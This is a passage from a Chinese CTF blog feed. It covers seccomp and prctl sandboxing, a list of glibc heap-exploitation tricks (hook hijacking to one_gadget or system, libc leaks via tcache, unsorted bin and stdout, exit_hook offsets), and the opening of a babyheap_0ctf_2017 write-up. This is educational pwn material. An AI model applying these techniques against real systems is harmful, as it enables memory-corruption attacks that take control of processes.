<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for use in declaring rules</span><br><span class="hljs-comment"> * @param arg the argument number, starting at 0</span><br><span class="hljs-comment"> * @param op the comparison operator, e.g. SCMP_CMP_*</span><br><span class="hljs-comment"> * @param datum_a dependent on comparison</span><br><span class="hljs-comment"> * @param datum_b dependent on comparison, optional</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_CMP(...)		((struct scmp_arg_cmp)&#123;__VA_ARGS__&#125;)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A0(...)		SCMP_CMP(0, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A1(...)		SCMP_CMP(1, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 2</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A2(...)		SCMP_CMP(2, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A3(...)		SCMP_CMP(3, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A4(...)		SCMP_CMP(4, __VA_ARGS__)</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Specify an argument comparison struct for argument 5</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_A5(...)		SCMP_CMP(5, __VA_ARGS__)</span><br><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Comparison operators</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">scmp_compare</span> &#123;</span><br>	_SCMP_CMP_MIN = <span class="hljs-number">0</span>,<br>	SCMP_CMP_NE = <span class="hljs-number">1</span>,		<span class="hljs-comment">/**&lt; not equal */</span><br>	SCMP_CMP_LT = <span class="hljs-number">2</span>,		<span class="hljs-comment">/**&lt; less than */</span><br>	SCMP_CMP_LE = <span class="hljs-number">3</span>,		<span class="hljs-comment">/**&lt; less than or equal */</span><br>	SCMP_CMP_EQ = <span class="hljs-number">4</span>,		<span class="hljs-comment">/**&lt; equal */</span><br>	SCMP_CMP_GE = <span class="hljs-number">5</span>,		<span class="hljs-comment">/**&lt; greater than or equal */</span><br>	SCMP_CMP_GT = <span class="hljs-number">6</span>,		<span class="hljs-comment">/**&lt; greater than */</span><br>	SCMP_CMP_MASKED_EQ = <span class="hljs-number">7</span>,		<span class="hljs-comment">/**&lt; masked equality */</span><br>	_SCMP_CMP_MAX,<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Argument datum</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> <span class="hljs-keyword">scmp_datum_t</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Argument / Value comparison definition</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scmp_arg_cmp</span> &#123;</span><br>	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> arg;	<span class="hljs-comment">/**&lt; argument number, starting at 0 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">scmp_compare</span> <span class="hljs-title">op</span>;</span>	<span class="hljs-comment">/**&lt; the comparison op, e.g. SCMP_CMP_* */</span><br>	<span class="hljs-keyword">scmp_datum_t</span> datum_a;<br>	<span class="hljs-keyword">scmp_datum_t</span> datum_b;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>举个例子：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;<br>	scmp_filter_ctx ctx;<br>	ctx = <span class="hljs-built_in">seccomp_init</span>(SCMP_ACT_ALLOW);<br>	<span class="hljs-built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL,         <span class="hljs-built_in">SCMP_SYS</span>(write),<span class="hljs-number">1</span>,<span class="hljs-built_in">SCMP_A2</span>(SCMP_CMP_EQ,<span class="hljs-number">0x10</span>));<span class="hljs-comment">//第2(从0)个参数等于0x10</span><br>	<span class="hljs-built_in">seccomp_load</span>(ctx);<br>	<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;i will give you a shell\n&quot;</span>,<span class="hljs-number">24</span>);<span class="hljs-comment">//不被拦截</span><br>	<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;1234567812345678&quot;</span>,<span class="hljs-number">0x10</span>);<span class="hljs-comment">//被拦截</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="prctl-函数"><a href="#prctl-函数" class="headerlink" title="prctl 函数"></a>prctl 函数</h2><p>查看函数原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></td></tr></table></figure>

<p>第一个参数是指定相应的操作，在手册上有特别多的选项，这里打算介绍两个。</p>
<h3 id="PR-SET-NO-NEW-PRIVS-用38表示"><a href="#PR-SET-NO-NEW-PRIVS-用38表示" class="headerlink" title="PR_SET_NO_NEW_PRIVS(用38表示)"></a>PR_SET_NO_NEW_PRIVS(用38表示)</h3><p>简单的说就是如果 option 设置为 <code>PR_SET_NO_NEW_PRIVS</code> 的话，第二个参数如果设置为 1 的话，<strong>不能够进行 execve 的系统调用，同时这个选项还会继承给子进程</strong>。</p>
<p>这样的话常规的调用 system 函数、one_gadget 的用不了了，这里的设置点其实和 <strong>pwnable.tw 上 orw 那道题一样，只能进行几个系统调用：open、write、read</strong>。</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/2.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/2.png"><span class="image-caption">img</span></a></strong></p>
<p>从上图可以看出，当prctl的第一个参数设置为38时，第二个参数设置为1时，变会触发上述效果。</p>
<h3 id="PR-SET-SECCOMP（用22表示）"><a href="#PR-SET-SECCOMP（用22表示）" class="headerlink" title="PR_SET_SECCOMP（用22表示）"></a>PR_SET_SECCOMP（用22表示）</h3><p>第二个参数，可以参见man手册里面的介绍</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/3.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/3.png"><span class="image-caption">img</span></a></strong></p>
<p>设置 seccomp ，其实也就是设置沙箱规则，这个 option 有两个子参数：</p>
<ul>
<li><p>这里如果设置了 <code>SECCOMP_MODE_STRICT</code> （用1表示）模式的话，系统调用只能使用 read, write,_exit 这三个。</p>
</li>
<li><p>如果设置了 <code>SECCOMP_MODE_FILTER</code> （用2表示）的话，系统调用规则就可以被 Berkeley Packet Filter（BPF） 的规则所定义，这玩意就是这里最最重点的东西了。</p>
<p>首先介绍一下这个BPF是啥吧，度娘上面的解释是：</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/4.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/4.png"><span class="image-caption">img</span></a></strong></p>
</li>
</ul>
<p>看解释感觉是网络数据包传输过滤的一种规则，但事实上，后面已经被引用为沙箱规则</p>
<blockquote>
<p>BPF 定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器，和赋值、算术、跳转指令。一条指令由一个定义好的结构 struct bpf_insn 表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。</p>
</blockquote>
<p>总结一些点：</p>
<ol>
<li><p><strong>结构赋值操作指令为</strong>：BPF_STMT、BPF_JUMP ，两个宏展开都是已经赋值的了struct bpf_insn结构。</p>
</li>
<li><p><strong>BPF 的主要指令有</strong> BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令</p>
</li>
<li><p><strong>BPF 条件判断跳转指令</strong>：BPF_JMP、BPF_JEQ，BPF_JA,BPF_JGT等，语法跟汇编语言几乎相等，根据后面的几个参数进行判断，然后跳转到相应的地方。</p>
</li>
<li><p><strong>返回指令</strong>：BPF_RET、BPF_K，返回后面参数的值</p>
</li>
<li><p><strong>一些杂用指令</strong>：BPF_H表示按字传输，BPF_W表示按双字传输，BPF_B表示按单个字节传输；BPF_ABS表示绝对偏移，BPF_IND表示相对偏移， <code>SECCOMP_RET_ALLOW</code> 表示允许， <code>SECCOMP_RET_ERRNO</code> 表示禁止。</p>
<p>这个其实背后也牵涉到很多内容，参见以下两篇文章的介绍。</p>
<p><a href="http://www.360doc.com/content/06/1026/17/13362_241408.shtml">http://www.360doc.com/content/06/1026/17/13362_241408.shtml</a></p>
</li>
</ol>
<p><a href="http://www.secwk.com/2019/09/20/6564/">http://www.secwk.com/2019/09/20/6564/</a></p>
<h2 id="seccomp-tools-工具"><a href="#seccomp-tools-工具" class="headerlink" title="seccomp-tools 工具"></a>seccomp-tools 工具</h2><p>以上设置在pwn题中遇到时一般都是禁止了一些系统调用。故可以<strong>seccomp-tools</strong>这个工具去查看禁用的系统调用。</p>
<ul>
<li><p>安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc ruby-dev</span><br><span class="hljs-meta">$</span><span class="bash"> gem install seccomp-tools</span><br></code></pre></td></tr></table></figure></li>
<li><p>使用：一般用到dump这个用法，其他详细用法可见上面github。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.secwk.com/2019/09/20/6564/">http://www.secwk.com/2019/09/20/6564/</a></p>
<p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
]]></content>
      <tags>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>堆二三事</title>
    <url>/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
    <content><![CDATA[<h1 id="一些关于堆的小知识点"><a href="#一些关于堆的小知识点" class="headerlink" title="一些关于堆的小知识点"></a>一些关于堆的小知识点</h1><p>（没有顺序，知识点是零散的，都是我自己学到一点，记录下一点）</p>
<p>1、当small chunk只有一个时，如果被释放了，会被划分到unsorted bin里面，如果只有一个时，该chunk的fd和bk都指向libc中的地址，可以借此泄露libc地址</p>
<p>如果程序没开PIE，可以试着考虑下泄露got表来获得libc地址</p>
<p>在高版本利用中可以借着large bin上存留libc地址进行泄露</p>
<p>2、当先调用了mmap函数时，malloc系列函数申请的chunk的地址是从heap的起始地址开始分配的，又有页（4KB）是内存分配的最小单位，导致heap地址的最低三位总是0x000。因此申请的chunk可以只要覆盖地址最低两位进行修改其fd和bk的值</p>
<p>3、在利用malloc_hook（__malloc_hook是一个弱类型的函数指针变量，指向void * function(size_t size void * caller)，当调用malloc系列函数时，会判断hook指针是否为空，不为空则调用它）函数时，要使用错位偏移，即为把<strong>hook函数地址-0x23（有时候也可以找找hook地址-0x20+0x5）</strong>。此时，在写上p8(0)*3+p64(one_gadget)即可获取shell（似乎有些不准确，虽然有的确实行的通，但是更全面的应该是检验的size位置是int类型的函数，所以我们应该查看低32位的数，所以不局限-0x20，可能是0x30，0x38等等，在gdb里面调试发现即可）</p>
<p>4、如果释放两个fast chunk进入fast bin中，如果有UAF漏洞，修改后进的堆块fd指针指向其他的同样大小的fast chunk，那么被指向的堆块会被认为是在fast bin中的，而这时候如果这个chunk的fd上有地址数据，就可以申请到那边去（适用于要借用unsorted chunk上的脏数据，覆盖低字节地址）</p>
<p>5、chunk的size字段的最末位的三个比特位被用作状态标识，所以，size字段的以16进制表示时，最后一位16进制数是不能算到size里面的</p>
<p>6、一个chunk的大小最小是0x20(32字节64位系统下)，或者0x10(16字节32位系统下)</p>
<p>7、在Glibc2.26之后的版本出现了Tcache机制，在64位情况下，tcache优先于其他bin链接收释放掉的0×20<del>0×410大小的堆块（32位下0xC</del>0x200），tcache最多可以接收7个chunk，多出的部分将按照原来Glibc版本里面的方式分配。</p>
<p>并且从tcache分配出去的chunk并不会检查被分配位置的size大小，也就是不必像之前的版本使用错位偏移来使size符合检查</p>
<p>利用Tcache泄露libc有以下几种方法：</p>
<ul>
<li>申请8个大堆块，释放8个，这里堆块大小，大于fastbin范围，就是填满tcache，让第八个进入unsorted bin中</li>
<li>有UAF的情况下，连续free 8次同一个堆块，这里堆块大小，大于fastbin范围</li>
<li>申请大堆块，大于0×400</li>
<li>修改堆上的Tcache管理结构，把count值改为7（count的值是有规律的，在Tcache里面，第一个字节存放的是0x20大小的堆块个数，每隔一个字节，堆块大小增加0x10，前0x40都是存放个数，后面的内容存放堆块地址），然后再次free一个该大小的chunk，注意防止chunk被top chunk合并</li>
</ul>
<p>以上都可以让chunk的fd和bk指针指向libc中的地址而泄露地址</p>
<p>8、当修改hook函数为one_gadget发现所有给的execve都不行时，这时需要我们借用__libc_realloc去调整栈的参数，使execve的环境被满足才可以利用成功。__realloc_hook的地址是__malloc_hook-0x8。因为调用realloc会执行许多的push指令，可以把rsp调整到满足环境。要查看push操作，可以把__libc_realloc地址加上n，指向的都是push指令</p>
<p>操作：把one_gadget写到__realloc_hook地址上，因为在使用malloc函数后面会调用到__relloc_hook；在__malloc_hook地址写上__libc_realloc+n(就会先执行__libc_realloc+n调整，再执行one_gadget)</p>
<p>注：根据libc版本问题，不一定都是__libc_realloc ，也可以是realloc</p>
<p>9、堆题libc都很重要,题目没给libc，如果存在double free，可以用其测试libc版本</p>
<ul>
<li>如果报fastbin double free 那就是2.23~2.26<ul>
<li>2.23下会检查free的fastbin chunk是不是fastbin链表中的第一个chunk</li>
</ul>
</li>
<li>如果没报错那就是2.27~2.28<ul>
<li>因为有tcahce，2.27的tcache没有任何检查</li>
</ul>
</li>
<li>如果报tcache double free那么就是2.29及其以上<ul>
<li>因为2.29以后tcache增加了key字段防止tcache double free</li>
</ul>
</li>
</ul>
<p>10、chunk的三个标志位：从高到低依次表示为：non_main_arena、is_mmap、prev_inuse</p>
<p>non_main_arena：0表示当前chunk是属于main_arena，1表示不属于</p>
<p>is_mmap：1表示当前chunk是使用mmap申请的，0表示不是</p>
<p>prev_inuse：1表示前一个chunk在被用户使用，0表示前一个chunk被释放</p>
<p>11、如果申请的chunk大小为0x60和0x68返回的是一样大小的chunk，而0x68多出的8个字节是使用了后一个chunk的presize</p>
<p>12、大小属于fastbinchunk被free的时候，不会改变next chunk的prev_inuse</p>
<p>13、想要让chunk进入small bins 或者large bins：</p>
<p>一、释放的chunk大小先达到 small bins 或者 large bins 的大小范围。该chunk先进入到 unsorted bin，然后再申请一次堆块，申请的大小大于之前释放的chunk，那么之前释放的chunk就会进入到small bins 或者large bins</p>
<p>二、释放的 chunk 大小先达到small bins 或者 large bins 的大小范围。该 chunk 进入到 unsorted bin 中，如果此时 unsorted bin 中存在其他的堆块，那么申请一个堆块（能够让其他堆块满足分配的）剩余的堆块就将会自动进入到相应的 bin 链中</p>
<p>14、如果从unsortedbin中分配出chunk，是从大chunk的头部开始分配的，分配完申请的大小之后把大chunk剩下的继续留在unsortedbin中</p>
<p>15、unsortedbin中的chunk重新分配出来时，里面的数据不会被系统清空（如果程序没动的话），所以里面还是存在着libc地址</p>
<p>16、getshell有个办法是：修改free_hook内容为system地址，然后free一个chunk，chunk内容为”/bin/sh”，就相当于执行了system(“/bin/sh”)，这种方法稳定getshell</p>
<p>17、在libc版本2.23及以下的时候，使用one_gadget稳定getshell，可以使用条件为[rsp+0x50] == NULL的one_gadget，然后对同一个chunk进行double free（指针没有置0）即可getshell</p>
<p>18、当把malloc_hook劫持为one_gadget失败时，除了可以去调整栈之外，还可以换思路去劫持free_hook，就是16中的办法，或者是劫持realloc（在malloc_hook-0x8的地方），往realloc_hook中写入one_gadget,malloc_hook中写入realloc函数的地址</p>
<p>19、因为free_hook前面一大段内容不存在像malloc_hook一样的0x7f的信息，所以要寻找的可以分配的堆头可能要往前找很大的偏移</p>
<ul>
<li>在2.23版本中可以使用unsortedbin attack（修改unsortedbin中的FD字段为0，BK字段为target addr - 0x10），在那边写入unsortedbin地址，从而拥有了0x7f（使用过之后如果fastbin里面没有chunk，那么申请堆块会到unsortedbin里面去找，找的话就会报错，此时需要到main_arena对应地址去修复unsortedbin的指针，改回原来的样子）</li>
<li>劫持top chunk，生成一个fastchunk释放掉，接着把fd指针修改为fastchunk的大小（如写入0x81），然后再把刚才释放的堆块申请出来，此时会在main_arena生成出一个0x81，可以通过fastchunk的检查，而在这个下方，就是top chunk的指针，把指针内容修改到目标地址前面的地址（地址需要符合top size），然后再申请堆块即可（此时不可以存在被释放的堆块，要让堆块是从top chunk中分配的）</li>
</ul>
<p>20、绕过calloc的清空数据：把堆的is_mmap位置改为1，calloc将不会清空属于mmap的堆块数据</p>
<p>顺序：释放==&gt;修改堆头==&gt;申请堆块</p>
<p>并且calloc函数不会分配tcache bin中的堆块，可以利用该函数直接绕过tcache</p>
<p>21、<code>tcache_perthread_struct</code>这个结构体是可以释放的，并且可以将它释放到<code>unsorted bin</code>中去，然后分配这个<code>unsorted bin chunk</code>，可以控制任意地址分配堆内存</p>
<p>22、当堆题中没有show功能时，要泄露出libc地址，需要借助stdout吐出libc地址</p>
<p>需要把__libc_stdout上的值修改为<code>p64(0xfbad1800) + p64(0) * 3 + &#39;\x00&#39;</code></p>
<p>23、当分配unsorted chunk时，如果剩下的块仍然大于0x80，并且还是唯一的，那这个新的unsorted chunkfd，bk指针仍然指向libc地址，并且分配出去的堆块，如果没有对堆块进行清零，那么上面将会存放着之前unsorted chunk的fd、bk指针</p>
<p>24、libc-2.23.so时的fd，bk指针，指向的是堆块的prev_size位置，libc-2.27.so时的fd，bk指针指向的是堆块的内容（就是存放fd，bk指针的位置）比libc-2.23.so多了0x10</p>
<p>25、利用exit_hook：劫持<code>_dl_rtld_lock_recursive</code>的值为one_gadget，当调用exit函数时可得到shell</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20210903170451297.png"><span class="image-caption">image-20210903170451297</span></p>
<p>在gdb中<code>p _rtld_global</code>可以找到这两个函数，但是要找到这个值所在地址，还需要在_rtld_global中寻找</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20210903172330664.png"><span class="image-caption">image-20210903172330664</span></p>
<p>libc-2.23.so:</p>
<ul>
<li>rtld_lock = libc_base + 0x5F0F48</li>
<li>rtld_unlock = libc_base + 0x5F0F50</li>
</ul>
<p>libc-2.27.so:</p>
<ul>
<li>rtld_lock = libc_base + 0x619F60</li>
<li>rtld_unlock = libc_base + 0x619F68</li>
</ul>
<p>注：上述只是2.23，2.27的libc版本，但是同2.23，2.27的libc其实还有小版本类型，但是不变的是都在<code>_rtld_global+3840</code>的地址</p>
<p>26、libc-2.27.so的unlink要先把tcache bin填满才能用，unlink要保证<code>unsorted bin是空的</code>，所以有时候泄露信息用了unsorted bin，要申请回来</p>
<p>27、当我们申请一个大于top chunk的堆块时，程序会调用mmap进行内存分配，分配下来堆块的地址是libc中的地址</p>
<p>28、libc-2.27堆的orw：利用setcontext+53的指令，把setcontext+53的地址一般写在__free_hook上，而shellcode写在堆上，然后进行释放堆块从而执行orw</p>
<p>29、当劫持堆块到tcache，释放tcache获得libc地址后， 由于 unsorted bin 的 fd 和 bk 会在 tcache struct 写一些数据，而这些数据会覆盖到 tcache struct 上的 counts，导致取出相应的 size 时发生错误，所以需要修复tcache，将<strong>不必要的数据清为 0，有需要伪造并取出的部分赋值为 1</strong>（因为高版本不允许tcache的count值为-1）</p>
<p>30、如果把malloc_hook劫持为system也是可以的，后面在调用malloc时传入参数，不传入size大小，而是变为/bin/sh的地址即可</p>
<p>31、realloc 函数原型：<code>extern void *realloc(void *mem_address, unsigned int newsize);</code></p>
<ul>
<li>mem_address 不变，newsize == 0，相当于释放原来的堆块；</li>
<li>mem_address == 0 &amp;&amp; newsize &gt; 0，相当于malloc；</li>
<li>mem_address 不变，newsize &gt; originsize，<code>先释放原堆块</code>，然后再malloc一个更大的堆块，原堆块内容会被拷贝过去；返回新堆块的地址</li>
<li>mem_address 不变，newsize &lt;= originsize，如果切割后剩下的堆块大于 2 * chunk_min_size则切割，剩下堆块被free，否则直接返回原堆块</li>
</ul>
<p>32、在利用offbynull构造overlap，遇到过多次：头尾两个要释放的堆块之间不能只间隔一个堆块，至少要两个才行，不然将无法成功利用offbynull</p>
<p>33、unsorted bin泄露出的main_arena + 96的libc地址和__malloc_hook的地址只相差一个字节的数据，所以如果拥有能在释放堆块修改的数据的权利时，可以修改main_arena + 96后一字节即可，可以避免要打印libc地址</p>
<p>34、large bin attack 利用：</p>
<ul>
<li><p><strong>TCACHE_MAX_BINS</strong>是tcache bin 链的最大数量，宏定义为<strong>64</strong>，可以修改其值为chunk的地址，那么所有chunk块free之后都会进入tcache，位置如下图所示。</p>
<p><img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20220304094405889.png"><span class="image-caption">image-20220304094405889</span></p>
</li>
<li><p>global_max_fast记录着 fast bin 的最大 size，改大之后，可以让更大的size也算入 fast bin ，然后可以依据 main_arena 就算的偏移，把堆地址写入到 fast bin 之后的任一地址上，位置如下图所示。</p>
</li>
</ul>
<p>​                    <img src="/2021/04/18/2021-04-18-%E5%A0%86%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20220310192041331.png"><span class="image-caption">image-20220310192041331</span></p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>堆入门题</title>
    <url>/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/</url>
    <content><![CDATA[<h1 id="纪念"><a href="#纪念" class="headerlink" title="纪念"></a>纪念</h1><p>第一次学习堆，特意为这题单发一个博客好了。作为接触堆的一个分界线吧！</p>
<h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210410075150.png"></p>
<p>照例checksec以及运行，发现开启了全部的缓解机制。进入ida静态分析，了解一下具体运行情况。审计一下其中的代码</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210414212529.png"></p>
<p>在main函数里面，可以看到分为了众多函数，首先v4是一个指针，其次他的值来自于sub_B70，我们要进入这个函数查看一番，返回了什么地址，并赋值给了v4</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210414212357.png"></p>
<p>在sub_B70这个函数中，调用了mmap函数，开辟了一段匿名映射区。该映射区起始地址为addr，长度为0x1000，权限为可写可执行，用于<strong>存放最多16个结构体。每个结构体包含in_use、size和buf_ptr三个域，分别表示堆块是否在被使用、堆的大小和指向堆块缓冲区的指针。</strong> 而函数sub_B70便是把这个匿名映射的地址返回给了v4。</p>
<p>接下来两个函数，一个是用来输出选项的字符串，一个是用来输入的，输入长度被限制为8个字节，就不细讲了。以及注意后面执行的四个函数，都是把v4指向的地址作为参数进入到函数中去。</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428230535.png" style="zoom:80%;">

<p>这是1.Allocate函数的代码，首先是在之前mmap申请的16个结构体中找到一个未被使用过的结构体，然后再要我们输入一个数，生成该数数值大小的一个堆，不能超过0x1000。</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428231105.png" style="zoom:80%;">

<p>这是2.Fill函数。首先读取一个数作为索引，并判断该对应的结构体是否被使用了。如果被使用了，则读取第二个数作为size，并且调用函数sub_11B2，把对应的结构体的buf_ptr指针和size作为参数。</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428231148.png" style="zoom:80%;">

<p>进入到sub_11B2函数中，可以很明显的得知，我们可以向Fill函数中的结构体buf_ptr指针指向的堆输入size个字符，不过只能输入一次。这里的read函数，对size大小并没限制，造成明显的溢出点，后面可以利用</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428231209.png" style="zoom:80%;">

<p>这是3.Free函数。首先读取一个数作为索引，并找到索引对应的结构体，如果该结构体被使用了，就把该结构体指向的堆释放了，同时把in_use、size和buf_ptr全部清零。</p>
<img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ图片20210428231232.png" style="zoom:80%;">

<p>最后一个dump函数。首先读取一个数作为索引，找到对应的结构体，如果被使用则调用函数sub_130F，把该结构体的buf_ptr和size两个域作为参数传入。这个函数就不再多介绍，与Fill中的函数类似，仅仅是把read换成了write，把堆的内容写到标准输出。</p>
<p>代码到此就审计完了，回顾整个代码，可以发现，在calloc申请堆的长度是不大于4096的，而在Fill中的read读取长度很明显可以大于4096，而造成堆溢出，这就是本题的漏洞点，之后的思考在于怎么利用这个堆溢出。</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418155849.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418162040.png"></p>
<p>首先，我们先创建五个chunk，四个是fast chunk，还有一个为small chunk。fast chunk通过fastbin来重叠chunk，small chunk用来获取libc_base。我们把chunk1和chunk2释放掉，根据fastbin后进先出的机制，我们只要再次申请同等大小的chunk，即可把原本释放掉的chunk“归还”回来。因为后面要通过chunk4获取libc偏移，所以我们要在chunk4上面重叠chunk2造成拥有两个指针都可以访问chunk4的地址，才能在把chunk4释放掉之后，仍然可以读取其值。所以接下来要把chunk2的fd的值改为指向chunk4即可。</p>
<p>因为刚开始申请空间时，调用了mmap，那么就可以保证chunk是从堆的起始地址开始分配的，也就是后三位是0x000开始的。那我们修改fd只需要把其修改其最后两位为0x80就可以。因为fast bin的大小有限制，所以还要一起把chunk4的size大小改为21。</p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418162937.png"></p>
<p><img src="/2021/04/13/2021-04-13-%E5%A0%86%E5%85%A5%E9%97%A8%E9%A2%98/QQ%E5%9B%BE%E7%89%8720210418163044.png"></p>
